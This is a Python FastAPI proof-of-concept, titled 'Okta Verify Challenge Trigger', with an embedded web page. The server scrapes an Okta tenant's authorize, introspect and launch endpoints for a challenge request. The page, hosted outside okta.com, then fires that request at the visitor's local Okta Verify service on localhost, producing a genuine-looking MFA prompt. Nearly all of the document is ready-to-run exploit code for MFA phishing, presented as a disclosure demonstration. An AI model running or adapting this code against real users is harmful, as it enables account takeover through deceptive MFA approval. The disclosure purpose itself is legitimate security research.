"""
POC – Okta Verify Challenge Trigger (split flow)

Backend:
  1. GET  /oauth2/v1/authorize               → extract stateToken from HTML
  2. POST /idp/idx/introspect                → exchange stateToken for stateHandle
  3. POST /idp/idx/authenticators/okta-verify/launch → get challengeRequest + httpsDomain + ports
  4. Return challengeRequest + httpsDomain + ports to browser

Frontend (browser):
  5. POST https://{httpsDomain}:{port}/challenge → fires directly to victim's localhost

This mirrors exactly how the real Okta widget works, and means the server
never needs to reach localhost — the browser does it.

Run:
  pip install fastapi uvicorn httpx
  python app.py
  open http://localhost:5000
"""

import re
import httpx
import uvicorn
from typing import Optional
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse

# ── Config ────────────────────────────────────────────────────────────────────

OKTA_HOST = "katphish.okta.com"

AUTHORIZE_URL = (
    f"https://{OKTA_HOST}/oauth2/v1/authorize"
    "?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26"
    "&code_challenge=u0Ro65lsejHZCTu2XXXwVKzkOEr69_xuG8pb3rKclKc"
    "&code_challenge_method=S256"
    "&nonce=0h9qE4oJRz3htVkyZ6xTbdNOpV2O03gpoT7sGQOyqBd5bQiDgIqEMWVrXMaVbraG"
    "&redirect_uri=https%3A%2F%2Fkatphish.okta.com%2Fenduser%2Fcallback"
    "&response_type=code"
    "&state=vfvJnxUHj3JNWMHFrYWXwN0pvFSsk9GHkIe4h8nM8ahePaHx7cIVxXTrA1DXfVKi"
    "&scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self"
    "%20okta.internal.enduser.read%20okta.internal.enduser.manage"
    "%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage"
    "%20okta.myAccount.sessions.manage%20okta.internal.navigation.enduser.read"
)

BASE_HEADERS = {
    "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Origin":     f"https://{OKTA_HOST}",
    "User-Agent": (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/145.0.0.0 Safari/537.36"
    ),
}

IDX_HEADERS = {
    **BASE_HEADERS,
    "Accept":       "application/json; okta-version=1.0.0",
    "Content-Type": "application/json",
}

# ── Extraction helpers ────────────────────────────────────────────────────────

def _extract_state_token(html: str) -> Optional[str]:
    """Extract stateToken from the /authorize HTML response (embedded JS variable)."""
    m = re.search(r"var\s+stateToken\s*=\s*'([\s\S]+?)'\s*;", html)
    if m:
        token = m.group(1)
        token = re.sub(r'\\\n', '', token)
        token = token.replace('\\x2D', '-')
        return token.strip()
    # Fallback: inside modelDataBag
    m = re.search(r'\\x22stateToken\\x22:\\x22([^\\]+)', html)
    if m:
        return m.group(1).replace('\\x2D', '-')
    return None


def _extract_state_handle(body: dict) -> Optional[str]:
    """Extract stateHandle from the /introspect JSON response."""
    return _find_in_values(body, "stateHandle")


def _find_in_values(obj, key):
    """Recursively find a key anywhere in a nested dict/list."""
    if isinstance(obj, dict):
        if key in obj:
            return obj[key]
        for v in obj.values():
            result = _find_in_values(v, key)
            if result:
                return result
    elif isinstance(obj, list):
        for item in obj:
            result = _find_in_values(item, key)
            if result:
                return result
    return None


def _status_text(code: int) -> str:
    return {
        200: "OK",
        201: "Created",
        400: "Bad Request — malformed request or invalid parameters",
        401: "Unauthorized — missing or invalid session/credentials",
        403: "Forbidden — valid session but action not permitted",
        404: "Not Found — endpoint or resource does not exist",
        410: "Gone — stateToken/stateHandle has expired",
        422: "Unprocessable Entity — valid request but semantic error",
        429: "Too Many Requests — rate limited by Okta",
        500: "Internal Server Error — Okta server error",
        503: "Service Unavailable",
    }.get(code, "Unknown Status")


# ── App ───────────────────────────────────────────────────────────────────────

app = FastAPI()


@app.get("/api/challenge")
async def get_challenge():
    """
    Server fetches challengeRequest + httpsDomain + ports from Okta.
    Returns them to the browser, which fires the local /challenge call itself.
    """
    async with httpx.AsyncClient(timeout=15, follow_redirects=True) as client:

        # Step 1: GET /authorize → extract stateToken
        try:
            r1 = await client.get(AUTHORIZE_URL, headers=BASE_HEADERS)
        except httpx.RequestError as e:
            raise HTTPException(502, f"/authorize unreachable: {e}")

        if r1.status_code != 200:
            raise HTTPException(r1.status_code,
                f"/authorize expected 200 OK, got {r1.status_code} "
                f"{_status_text(r1.status_code)}: {r1.text[:400]}")

        state_token = _extract_state_token(r1.text)
        if not state_token:
            raise HTTPException(422, "stateToken not found in /authorize response")

        # Step 2: POST /introspect → get stateHandle
        try:
            r2 = await client.post(
                f"https://{OKTA_HOST}/idp/idx/introspect",
                json={"stateToken": state_token},
                headers=IDX_HEADERS,
            )
        except httpx.RequestError as e:
            raise HTTPException(502, f"/introspect unreachable: {e}")

        if r2.status_code not in (200, 201):
            raise HTTPException(r2.status_code,
                f"/introspect expected 200 OK, got {r2.status_code} "
                f"{_status_text(r2.status_code)}: {r2.text[:400]}")

        state_handle = _extract_state_handle(r2.json())
        if not state_handle:
            raise HTTPException(422, "stateHandle not found in /introspect response")

        # Step 3: POST /launch → get challengeRequest + httpsDomain + ports
        try:
            r3 = await client.post(
                f"https://{OKTA_HOST}/idp/idx/authenticators/okta-verify/launch",
                json={"stateHandle": state_handle},
                headers=IDX_HEADERS,
            )
        except httpx.RequestError as e:
            raise HTTPException(502, f"/launch unreachable: {e}")

        if r3.status_code not in (200, 201):
            raise HTTPException(r3.status_code,
                f"/launch expected 200 OK, got {r3.status_code} "
                f"{_status_text(r3.status_code)}: {r3.text[:400]}")

        body3 = r3.json()
        challenge_request = _find_in_values(body3, "challengeRequest")
        https_domain      = _find_in_values(body3, "httpsDomain")
        ports             = _find_in_values(body3, "ports")

        if not challenge_request:
            raise HTTPException(422, "challengeRequest not found in /launch response")
        if not https_domain:
            raise HTTPException(422, "httpsDomain not found in /launch response")
        if not ports:
            raise HTTPException(422, "ports not found in /launch response")

        # Return to browser — browser will fire the local /challenge call
        return {
            "challengeRequest": challenge_request,
            "httpsDomain":      https_domain.rstrip("/"),
            "ports":            ports,
        }


# ── Frontend ──────────────────────────────────────────────────────────────────

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Okta Verify – Phishing POC</title>
<style>
  body{font-family:monospace;background:#0f0f0f;color:#e0e0e0;padding:3rem;max-width:700px;margin:auto}
  h1{color:#f87171;font-size:1.6rem;margin-bottom:.5rem}
  h2{color:#94a3b8;font-size:1rem;font-weight:normal;margin-bottom:2rem}
  .warning{background:#1e1e2e;border-left:4px solid #f87171;padding:1rem 1.25rem;
           border-radius:4px;margin-bottom:2rem;font-size:.9rem;line-height:1.6;color:#cbd5e1}
  .warning strong{color:#f87171}
  button{padding:.75rem 2rem;background:#f87171;color:#0f0f0f;font-weight:bold;
         border:none;border-radius:4px;cursor:pointer;font-size:1rem;letter-spacing:.03em}
  button:hover{background:#ef4444}
  button:disabled{background:#475569;color:#94a3b8;cursor:not-allowed}
  #status{margin-top:1.5rem}
  pre{background:#1e1e2e;padding:.75rem;border-radius:4px;font-size:.85rem;
      white-space:pre-wrap;word-break:break-all}
  .err{color:#f87171}.info{color:#facc15}
  .domain{color:#7dd3fc;font-style:italic}
</style>
</head>
<body>
<h1>⚠️ Okta Verify is Not Phishing-Resistant</h1>
<h2>Proof of Concept — Cross-Domain MFA Trigger</h2>

<div class="warning">
  <strong>What this demonstrates:</strong><br><br>
  This page is hosted on <span class="domain">a domain completely outside okta.com</span> — unrelated to any Okta tenant.<br><br>
  Clicking the button below will trigger a real <strong>Okta Verify challenge on your desktop</strong>,
  indistinguishable from a legitimate login prompt.
</div>

<button id="btn" onclick="run()">▶ Trigger Okta Verify</button>

<div id="status"></div>

<script>
async function run() {
  const btn = document.getElementById('btn');
  btn.disabled = true;
  setStatus('info', '⏳ Fetching challenge from Okta…');

  try {
    // Step 1: backend fetches challengeRequest from Okta server-side
    const res = await fetch('/api/challenge');
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      setStatus('err', '❌ ' + (data.detail ?? `HTTP ${res.status}`));
      btn.disabled = false;
      return;
    }

    const { challengeRequest, httpsDomain, ports } = await res.json();
    setStatus('info', '⏳ Firing challenge to local Okta Verify…');

    // Step 2: browser fires directly to victim's localhost
    // Try httpsDomain first (Mac), then http://localhost and http://127.0.0.1 (Windows)
    const targets = [
      ...ports.map(p => `${httpsDomain}:${p}`),
      ...ports.map(p => `http://localhost:${p}`),
      ...ports.map(p => `http://127.0.0.1:${p}`),
    ];

    let fired = false;
    for (const url of targets) {
      try {
        await fetch(`${url}/challenge`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ challengeRequest }),
        });
        fired = true;
        break;
      } catch {
        continue;
      }
    }

    if (!fired) {
      setStatus('err', '❌ Local Okta Verify service unreachable on any port: ' + ports.join(', '));
    } else {
      document.getElementById('status').innerHTML = '';
    }

  } catch(e) {
    setStatus('err', '❌ ' + e.message);
  }

  btn.disabled = false;
}

function setStatus(cls, msg) {
  document.getElementById('status').innerHTML =
    '<pre class="' + cls + '">' + msg.replace(/</g,'&lt;') + '</pre>';
}
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML


if __name__ == "__main__":
    import os
    uvicorn.run("app:app", host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
